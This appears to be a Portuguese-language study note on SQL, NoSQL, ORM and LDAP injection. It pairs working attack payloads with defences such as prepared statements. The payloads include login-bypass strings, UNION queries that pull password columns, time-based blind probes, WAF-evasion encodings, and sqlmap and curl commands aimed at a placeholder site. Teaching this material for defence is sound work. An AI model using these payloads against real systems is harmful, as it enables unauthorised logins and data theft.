# Query Bypass

Técnicas de ataque que manipulam queries (SQL, NoSQL, LDAP, ORM) para burlar autenticação, exfiltrar dados ou escalar privilégios — e como se defender.

Related: [[Security/IAM]], [[Linux/Security]], [[PHP/Persistence]]

---

## SQL Injection — O Clássico

O atacante injeta SQL dentro de um input que é concatenado na query:

```php
// ❌ Vulnerável — concatenação direta
$query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
```

### Authentication Bypass

```
Input:
  email: admin@site.com
  password: ' OR '1'='1

Query gerada:
  SELECT * FROM users WHERE email = 'admin@site.com' AND password = '' OR '1'='1'
                                                                     ^^^^^^^^^^^^^^^^
                                                                     sempre true → logado como admin
```

Variações comuns:

```sql
-- Bypass com comentário
' OR 1=1 --
' OR 1=1 #
' OR 1=1 /*

-- Bypass com UNION
' UNION SELECT 1,2,3 --

-- Bypass sem aspas (campos numéricos)
1 OR 1=1
```

### Data Exfiltration (UNION-based)

```sql
-- Descobre número de colunas
' ORDER BY 1 --    ← ok
' ORDER BY 2 --    ← ok
' ORDER BY 5 --    ← erro → tabela tem 4 colunas

-- Extrai dados de outra tabela
' UNION SELECT username, password, null, null FROM users --
```

### Blind SQL Injection

Quando a resposta não mostra dados, mas muda comportamento:

```sql
-- Boolean-based: resposta muda se true/false
' AND 1=1 --    ← página normal
' AND 1=2 --    ← página diferente

-- Time-based: mede tempo de resposta
' AND SLEEP(5) --                         ← MySQL
' AND pg_sleep(5) --                      ← PostgreSQL
'; WAITFOR DELAY '0:0:5' --               ← SQL Server

-- Extrai dados 1 char por vez
' AND SUBSTRING(password,1,1)='a' --      ← true? primeiro char é 'a'
```

### Second-Order Injection

O payload é armazenado no banco e executado depois:

```
1. Registro: username = "admin'--"    ← salvo no banco
2. Outro endpoint usa esse valor em query:
   SELECT * FROM logs WHERE user = 'admin'--'
                                         ^^^^ comentou o resto
```

## Defesa — Parameterized Queries

**A única defesa real contra SQL injection:**

```php
// ✅ PDO com prepared statement
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email AND password = :password');
$stmt->execute(['email' => $email, 'password' => $password]);

// ✅ MySQLi
$stmt = $mysqli->prepare('SELECT * FROM users WHERE email = ? AND password = ?');
$stmt->bind_param('ss', $email, $password);
$stmt->execute();
```

O banco recebe a query e os dados **separadamente** — o input NUNCA vira parte do SQL.

```php
// ❌ Isso NÃO protege
$email = addslashes($email);          // bypass possível com charset tricks
$email = mysqli_real_escape_string($conn, $email);  // melhor, mas não à prova

// ❌ Isso também não
$email = htmlspecialchars($email);    // protege XSS, não SQL injection
```

## ORM Injection

Usar ORM não garante segurança se passar raw queries:

```php
// ❌ Eloquent vulnerável (raw where)
User::whereRaw("email = '$email'")->first();

// ✅ Eloquent seguro
User::where('email', $email)->first();

// ❌ Doctrine vulnerável
$em->createQuery("SELECT u FROM User u WHERE u.email = '$email'");

// ✅ Doctrine seguro
$em->createQuery('SELECT u FROM User u WHERE u.email = :email')
   ->setParameter('email', $email);
```

## NoSQL Injection (MongoDB)

```javascript
// ❌ Vulnerável
db.users.find({ email: req.body.email, password: req.body.password });

// Ataque — input JSON:
{ "email": "admin@site.com", "password": { "$ne": "" } }

// Query resultante:
db.users.find({ email: "admin@site.com", password: { $ne: "" } })
//                                                   ^^^^^^^^ qualquer senha ≠ "" → match
```

**Defesa:** validar e tipar inputs. Se espera string, rejeitar objetos.

```javascript
if (typeof req.body.password !== 'string') {
    return res.status(400).json({ error: 'Invalid input' });
}
```

## LDAP Injection

```
// ❌ Vulnerável
(&(uid=$username)(password=$password))

// Input: username = admin)(|(uid=*
// Query: (&(uid=admin)(|(uid=*))(password=qualquercoisa))
//         → retorna todos os usuários
```

**Defesa:** escapar metacaracteres LDAP: `*`, `(`, `)`, `\`, `NUL`.

## WAF Bypass Techniques

Atacantes tentam burlar Web Application Firewalls:

```sql
-- Case variation
SeLeCt * FrOm users

-- Encoding
%27%20OR%201%3D1%20--          (URL encoded)

-- Double encoding
%2527%2520OR%25201%253D1

-- Inline comments (MySQL)
SEL/**/ECT * FR/**/OM users

-- Concat/char
CONCAT(0x61,0x64,0x6D,0x69,0x6E)    → 'admin'
CHAR(97,100,109,105,110)              → 'admin'

-- Alternative whitespace
SELECT\tname\tFROM\tusers          (tab em vez de espaço)
```

## Checklist de Proteção

- **Sempre** usar prepared statements / parameterized queries
- **Nunca** concatenar input em queries (SQL, NoSQL, LDAP)
- Validar e tipar todos os inputs no backend (não confiar no frontend)
- Usar ORM com bindings, nunca `whereRaw` com input do usuário
- Aplicar **principle of least privilege** no usuário do banco
- Habilitar WAF como camada extra (não como defesa única)
- Logar queries suspeitas (muitos `'`, `--`, `UNION`, `SLEEP`)
- Manter banco e drivers atualizados

## Ferramentas de Teste

```bash
# SQLMap — automatiza detecção e exploração
sqlmap -u "https://site.com/login?email=test" --dbs

# Burp Suite — intercepta e modifica requests
# OWASP ZAP — scanner grátis

# Manual — curl
curl -X POST https://site.com/login \
  -d "email=admin'--&password=x"
```

## Related

- [[Security/IAM]]
- [[Security/ThreatModeling]]
- [[PHP/Persistence]]
- [[Linux/Security]]

## Resources

- https://owasp.org/www-community/attacks/SQL_Injection
- https://portswigger.net/web-security/sql-injection
- https://sqlmap.org

#### My commentaries
- 
